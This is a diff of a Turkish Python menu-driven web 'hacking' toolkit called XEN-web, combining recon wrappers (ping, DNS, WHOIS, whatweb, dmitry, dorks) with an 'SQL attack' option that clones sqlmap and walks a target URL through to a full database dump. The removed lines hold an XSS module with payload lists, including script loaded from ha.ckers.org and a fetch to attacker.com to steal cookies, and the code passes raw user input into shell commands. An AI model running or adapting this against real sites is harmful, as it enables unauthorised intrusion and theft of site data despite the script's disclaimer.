@@ -1,3 +1,4 @@
+  GNU nano 8.3                                                                                                                                                                                                                                                                                                                                                                                                                                                                   sql.py                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
 import subprocess
 import platform
 import socket
@@ -7,16 +8,13 @@ import requests
 import os
 import time
 import sys
-from bs4 import BeautifulSoup
 from colorama import Fore, Style
 
 os.system("clear")
 os.system("pip3 install python-whois")
 os.system("pip3 install requests")
-os.system("pip3 install beautifulsoup4")
 os.system("pip3 install dnspython")
 os.system("clear")
-
 
 print(Fore.RED + "")
 def get_local_ip():
@@ -39,7 +37,6 @@ gateway = data["query"]
 print("Kullanılan ip:", gateway)
 time.sleep(2)
 
-
 print(Fore.GREEN + "")
 def yukleme_animasyonu():
     animasyon_karakterleri = ["|", "/", "-", "\\"]
@@ -57,44 +54,31 @@ print("Yüklendi <3")
 os.system("clear")
 
 print(Fore.RED + """
+__  _______ _   _    __        _______ ____
+\ \/ / ____| \ | |   \ \      / / ____| __ )
+ \  /|  _| |  \| |____\ \ /\ / /|  _| |  _ \ 
+ /  \| |___| |\  |_____\ V  V / | |___| |_) |
+/_/\_\_____|_| \_|      \_/\_/  |_____|____/
 
+   github -> https://github.com/ghost0x02/xen-web
 
-    .-----.
-   .' -   - '.
-  /  .-. .-.  *
-  |  | | | |  |
-   \ \o/ \o/ /
-  _/    ^    \_
- | \  '---'  / |
- / /`--. .--`\ *
-/ /'---` `---'\ *
-'.__.       .__.'
-    `|     |`
-     |     *
-     \      '--.
-      '.        `*
-        `'-      /
-           ,__) /
-            `..'
-      XEN-web 1.0v
-TAMAMEN KALI LINUX İÇİN KODLANMIŞTIR 
+   instagram -> xsecit
 
 """)
 print(Style.RESET_ALL)
 
 print(Fore.CYAN + """
 
-(1) PING TARA
-(2) DNS SORGU
-(3) WHOIS SORGU
-(4) HTTP KONTROLü
-(5) SQL SALDIRISI
-(6) XSS SALDIRISI
-(7) KULLANIM KOŞULLARI
-(8) DMITRY SORGU
-(9) DORK ÜRETİCİSİ
-(10) WHATWEB???
-(11) ÇIKIŞ
+(1)> PING TARA <
+(2)> DNS SORGU <
+(3)> WHOIS SORGU <
+(4)> HTTP KONTROLÜ <
+(5)> SQL SALDIRISI <
+(6)> KULLANIM KOŞULLARI <
+(7)> DMITRY SORGU <
+(8)> DORK ÜRETİCİSİ <
+(9)> WHATWEB??? <
+(10)> ÇIKIŞ <
 
 """)
 
@@ -105,8 +89,6 @@ islemno = input("root@XEN-web:~ ")
 print(Style.RESET_ALL)
 
 def ping(host):
-
-
     os.system("clear")
     print(Fore.MAGENTA + "")
     print("""
@@ -133,7 +115,6 @@ def ping(host):
         print(response.stderr)
 
 def dns_lookup(domain):
-
     os.system("clear")
     print(Fore.MAGENTA + "")
     print("""
@@ -150,8 +131,6 @@ def dns_lookup(domain):
 ▐░█▄▄▄▄▄▄▄█░▌▐░▌     ▐░▐░▌ ▄▄▄▄▄▄▄▄▄█░▌
 ▐░░░░░░░░░░▌ ▐░▌      ▐░░▌▐░░░░░░░░░░░▌
  ▀▀▀▀▀▀▀▀▀▀   ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀""")
-
-
 
     print(Fore.GREEN + "")
     record_types = ['A', 'MX', 'NS', 'TXT', 'SOA']
@@ -171,7 +150,6 @@ def dns_lookup(domain):
             break
 
 def whois_lookup(domain):
-
     os.system("clear")
     print(Fore.MAGENTA + "")
     print("""
@@ -216,7 +194,6 @@ l  `  '  !|  |  ||     ||  | /  \ |
         print(f"WHOIS sorgusunda bir hata oluştu: {e}")
 
 def http_header_check(url):
-
     os.system("clear")
     print(Fore.MAGENTA + "")
     print("""
@@ -243,10 +220,9 @@ def http_header_check(url):
         print(f"HTTP Kontrolü sırasında bir hata oluştu: {e}")
 
 def sql_attack():
-
-  os.system("clear")
-  print(Fore.RED + "")  
-  print("""
+    os.system("clear")
+    print(Fore.RED + "")  
+    print("""
  █████████     ██████    █████
  ███░░░░░███  ███░░░░███ ░░███
 ░███    ░░░  ███    ░░███ ░███
@@ -254,179 +230,24 @@ def sql_attack():
  ░░░░░░░░███░███   ██░███ ░███      █
 ░░█████████  ░░░██████░██ ███████████
  ░░░░░░░░░     ░░░░░░ ░░ ░░░░░░░░  """)
-  print(Style.RESET_ALL)
-  print(Fore.CYAN + "")
-  print("Bu program enesxsec ve ghost0x02 tarafından kodlanmıştır...")
-  print("---------------------------------------------------")
-  print("Bir dakika...")
-  time.sleep(1)
-  os.system("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev")
-  os.chdir("sqlmap-dev")
-  os.system("python3 sqlmap.py -u " + url + " --dbs")
-  db = input("Hangi veritabanının içe aktarılacağını seçin: ")
-  os.system("clear")
-  os.system("python3 sqlmap.py -u " + url + " -D " + db + " --tables")
-  tb = input("Hangi tabloyu çekeceğinizi seçin: ")
-  os.system("clear")
-  os.system("python3 sqlmap.py -u " + url + " -D " + db + " -T " + tb + " --columns")
-  cl = input("Hangi sütunları çekeceğinizi seçin: ")
-  os.system("clear")
-  os.system("python3 sqlmap.py -u " + url + " -D " + db + " -T " + tb + " -C " + cl + " --dump")
-
-def xss_scan(url):
-
+    print(Style.RESET_ALL)
+    print(Fore.CYAN + "")
+    print("Bu program enesxsec ve ghost0x02 tarafından kodlanmıştır...")
+    print("---------------------------------------------------")
+    print("Bir dakika...")
+    time.sleep(1)
+    os.system("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev")
+    os.chdir("sqlmap-dev")
+    os.system("python3 sqlmap.py -u " + url + " --dbs")
+    db = input("Hangi veritabanının içe aktarılacağını seçin: ")
     os.system("clear")
-    print(Fore.RED + """
-
- ██╗  ██╗███████╗███████╗
- ╚██╗██╔╝██╔════╝██╔════╝
-  ╚███╔╝ ███████╗███████╗
-  ██╔██╗ ╚════██║╚════██║ attack 1.0v
- ██╔╝ ██╗███████║███████║
- ╚═╝  ╚═╝╚══════╝╚══════╝
-
-""")
-
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            print(Fore.YELLOW + f"{url} adresi başarıyla tarandı!")
-            print(Fore.RED + "")
-            time.sleep(4)
-            soup = BeautifulSoup(response.content, 'html.parser')
-            forms = soup.find_all('form')
-
-            for form in forms:
-                print(f"Form bulundu: {form}")
-                stored_xss_test(soup, url)
-                reflected_xss_test(form, url)
-                dom_based_xss_test(form, url)
-                blind_xss_test(form, url)
-
-        else:
-            print(f"URL'ye bağlanırken bir hata oluştu. Durum kodu: {response.status_code}")
-
-    except Exception as e:
-        print(f"XSS taraması sırasında bir hata oluştu: {e}")
-
-def stored_xss_test(soup, url):
-    stored_xss_payloads = [
-        '<script>alert("Stored XSS Attack")</script>',
-        '<img src="x" onerror="alert(\'Stored XSS Attack\')" />',
-        '<svg onload="alert(\'Stored XSS Attack\')"></svg>'
-        '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pg=="></EMBED>',
-        '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
-        '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
-        '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">',
-        '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"></HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');+ADw-/SCRIPT+AD4-',
-        '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
-        '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
-        '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
-        '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
-        '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
-        '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
-        '<IMG SRC="jav&#x0C;ascript:alert(\'XSS\');">',
-        '<IMG SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pg=="></EMBED>',
-        '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>',
-        '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
-        '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
-        '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>',
-        '<IMG DYNSRC="javascript:alert(\'XSS\')">',
-        '<IMG LOWSRC="javascript:alert(\'XSS\')">',
-        '<BGSOUND SRC="javascript:alert(\'XSS\');">',
-        '<BR SIZE="&{alert(\'XSS\')}">',
-        '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
-        '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
-        '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
-        '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
-    ]
-
-    for payload in stored_xss_payloads:
-        if payload in soup.text:
-            print(f"Stored XSS zafiyeti bulundu: {url} - Payload: {payload}")
-
-def reflected_xss_test(form, url):
-    reflected_xss_payloads = [
-        '<script>alert("Reflected XSS Attack")</script>',
-        '<img src="x" onerror="alert(\'Reflected XSS Attack\')" />',
-        '<svg onload="alert(\'Reflected XSS Attack\')"></svg>'
-        '<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
-        '<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
-        '<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
-        '<SCRIPT "a=\'>\'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
-        '<SCRIPT a=> SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
-        '<SCRIPT a=">\'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
-        '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
-        '<A HREF="http://66.102.7.147/">XSS</A>',
-        '<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>',
-        '<A HREF="http://1113982867/">XSS</A>',
-        '<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>',
-        '<A HREF="http://0102.0146.0007.00000223/">XSS</A>',
-        '<A HREF="htt   p://6   6.000146.0x7.147/">XSS</A>',
-        '<input/onmouseover="javaSCRIPT:confirm(1)">',
-        '<sVg><scRipt %00>alert(1) {Opera}',
-        '<img/src=%00 onerror=this.onerror=confirm(1)>',
-        '<IMG><SCRIPT>alert("XSS")</SCRIPT>">',
-        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
-        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
-        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
-        '<IMG SRC=javascript:alert("XSS")>',
-        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
-        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
-        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
-        '<IMG SRC=javascript:alert("XSS")>',
-        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
-        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
-        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
-        '<IMG SRC=javascript:alert("XSS")>',
-        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
-        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
-        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
-        '<IMG SRC=javascript:alert("XSS")>',
-        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
-        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
-        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
-        '<IMG SRC=javascript:alert("XSS")>',
-        '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
-        '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
-        '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
-        '<IMG SRC=javascript:alert("XSS")>',
-    ]
-
-    for payload in reflected_xss_payloads:
-        for input_field in form.find_all('input'):
-            input_field['value'] = payload
-            response = requests.post(url, data=form)
-            if payload in response.text:
-                print(f"Reflected XSS zafiyeti bulundu: {url} - Payload: {payload}")
-
-def dom_based_xss_test(form, url):
-    dom_based_xss_payloads = [
-        '<script>document.write("DOM-based XSS Attack")</script>',
-        '<img src="x" onerror="alert(\'DOM-based XSS Attack\')" />',
-        '<svg onload="alert(\'DOM-based XSS Attack\')"></svg>'
-    ]
-
-    for payload in dom_based_xss_payloads:
-        for input_field in form.find_all('input'):
-            input_field['value'] = payload
-            response = requests.post(url, data=form)
-            if payload in response.text:
-                print(f"DOM-based XSS zafiyeti bulundu: {url} - Payload: {payload}")
-
-def blind_xss_test(form, url):
-    blind_xss_payloads = [
-        '<img src="x" onerror="alert(\'Blind XSS Attack\')" />',
-        '<script src="https://attacker.com/malicious.js"></script>',
-        '<svg><script>fetch("https://attacker.com/steal-cookies")</script></svg>'
-    ]
-
-    for payload in blind_xss_payloads:
-        for input_field in form.find_all('input'):
-            input_field['value'] = payload
-            response = requests.post(url, data=form)
-            if response.status_code == 200:
-                print(f"Blind XSS zafiyeti bulundu: {url} - Payload: {payload}")
+    os.system("python3 sqlmap.py -u " + url + " -D " + db + " --tables")
+    tb = input("Hangi tabloyu çekeceğinizi seçin: ")
+    os.system("clear")
+    os.system("python3 sqlmap.py -u " + url + " -D " + db + " -T " + tb + " --columns")
+    cl = input("Hangi sütunları çekeceğinizi seçin: ")
+    os.system("clear")
+    os.system("python3 sqlmap.py -u " + url + " -D " + db + " -T " + tb + " -C " + cl + " --dump")
 
 def kullanım_koşulları():
     print(Fore.GREEN + """
@@ -452,40 +273,22 @@ def kullanım_koşulları():
 
     (1) SORGU YAPARKEN TAMAMEN KENDİ SİSTEMLERİNİZ ÜZERİNDEN YAPIN
     (2) BU SİBER GÜVENLİK YAZILIMININ SORUMLUSU HERHANGİ BİR YASAL İŞLEM KABUL ETMEYECEKTİR!!!
-    (3) XSS-SQL GİBİ BÜYÜK ZAFİYET TARAYAN PROGRAMLARI SADECE TEST İÇİN KULLANIN
+    (3) SQL GİBİ BÜYÜK ZAFİYET TARAYAN PROGRAMLARI SADECE TEST İÇİN KULLANIN
     (4) YAPILAN BÜTÜN TARAMALAR KENDİ SORUMLULUĞUNUZ ÜZERİNEDİR
-    (5) XSS NEDİR?
-
-        XSS (Cross-Site Scripting), Türkçe olarak "Kurumlararası Komut Dosyası Çapraz Etkileşimi" anlamına gelir. 
-        Bu bir web güvenlik açığıdır ve saldırganların web uygulamaları üzerinden
-        kullanıcıların tarayıcılarında kötü niyetli komut dosyaları çalıştırmasına olanak tanır.
-
-        Peki bu XSS aracında kullanılan Blind açığı nedir?
-
-        XSS (Cross-Site Scripting) blind açığı, klasik XSS açıklarından farklı olarak,
-        saldırganın kötü niyetli komut dosyalarını direkt olarak göremediği veya sonuçları doğrudan alamadığı durumları ifade eder.
-        Bu tür bir açıkta, saldırgan tarafından enjekte edilen XSS payload'u çalıştırılırken,
-        sonuçlar genellikle tarayıcıda doğrudan görüntülenmez veya saldırganın kontrolü dışındaki bir şekilde gerçekleşir.
-
-        XSS blind açıkları genellikle sızma testleri ve güvenlik açısından önemli bir konudur
-        çünkü saldırganlar tarafından istismar edilebilir ve saldırıya uğramış web uygulamalarında fark edilmesi zor olabilir.
-        Bu tür açıklardan korunmak için web uygulamaları giriş doğrulama, veri filtreleme ve güvenlik kontrolleri gibi önlemler almalıdır.
-        Ayrıca, düzenli güvenlik testleri ve güvenlik bilinci eğitimleri de önemli rol oynar.
-
-    (6) SQL SALDIRISI NEDİR?
+    (5) SQL SALDIRISI NEDİR?
 
         SQL saldırısı (SQL Injection),
         web uygulamalarında yaygın olarak görülen bir güvenlik açığıdır.
         Bu açık, saldırganların web uygulamalarının SQL tabanlı veritabanlarına istismar ederek
         kötü niyetli SQL sorguları göndermesine izin verir.
 
-    (7) NEYİ HEDEFLİYORUZ?
+    (6) NEYİ HEDEFLİYORUZ?
 
        - internet sitelerinin güvenlik açıklarını test etmeyi.
        - Eğer açık bulunduysa site sahiplerine bildirmeyi.
-       - SQL VE XSS gibi zafiyet araçlarının doğru kullanımını.
+       - SQL gibi zafiyet araçlarının doğru kullanımını.
        - Siber Güvenlik yapmak için saygın birisi olmanızı hedefliyoruz :D <3.
-    (8)
+    (7)
 
         - Whatweb ve Dmitry araçlarını bir arada kullanarak hedef sistem üzerinde
           detaylı aramalar yapabilirsiniz.
@@ -512,7 +315,6 @@ Yöntem: Ağ odaklı bilgi toplama                     <>                       
                        iletişim == ig: xsecit """)
 
 def dmt():
-
     os.system("clear")
     print(Fore.RED + """
 
@@ -524,7 +326,6 @@ def dmt():
 ██████╔╝██║ ╚═╝ ██║██║   ██║   ██║  ██║   ██║
 ╚═════╝ ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝
 """)
-
 
     os.system(f"dmitry -w {url}")
     time.sleep(2)
@@ -538,9 +339,7 @@ def dmt():
     time.sleep(2)
 
 def dork():
-
     os.system("clear")
-
     print(Fore.RED + """
 
 '||''|.    ..|''||   '||''|.   '||'  |'
@@ -601,15 +400,11 @@ def dork():
     """)
 
 def whatweb():
-
     os.system("clear")
     print(Fore.YELLOW + "")
     os.system(f"whatweb -v {url}")
 
-
-
 def exit():
-
     print(Fore.CYAN + "Görüşürüz dost!")
 
 if islemno == "1":
@@ -626,31 +421,33 @@ elif islemno == "3":
     whois_lookup(domain)
 elif islemno == "4":
     print(Fore.MAGENTA + "")
-    url = input("HTTP kontroü yapmak istediğiniz URL'yi girin: ")
+    url = input("HTTP kontrolü yapmak istediğiniz URL'yi girin: ")
     http_header_check(url)
 elif islemno == "5":
     print(Fore.MAGENTA + "")
-    url = input("SQL saldırısı  yapmak istediğiniz URL adresini girin: ")
+    url = input("SQL saldırısı yapmak istediğiniz URL adresini girin: ")
     sql_attack()
 elif islemno == "6":
     print(Fore.MAGENTA + "")
-    url = input("XSS taraması yapmak istediğiniz URL adresini girin: ")
-    xss_scan(url)
-elif islemno == "7":
-    print(Fore.MAGENTA + "")
     kullanım_koşulları()
-elif islemno == "8":
+elif islemno == "7":
     print(Fore.MAGENTA + "")
     url = input("Dmitry taraması yapmak istediğiniz URL adresini girin: ")
     dmt()
-elif islemno == "9":
+elif islemno == "8":
     dork()
-elif islemno == "10":
+elif islemno == "9":
     print(Fore.MAGENTA + "")
-    url = input("Detaylı WEB taraması için host adını girin örnek -> (https://example.com): ")
+    url = input("Detaylı WEB taraması için host adını girin örnek ->[](https://example.com): ")
     whatweb()
-elif islemno == "11":
+elif islemno == "10":
     exit()
-
 else:
     print(Fore.RED + "Geçersiz seçenek!!!")
+
+
+
+
+
+
+
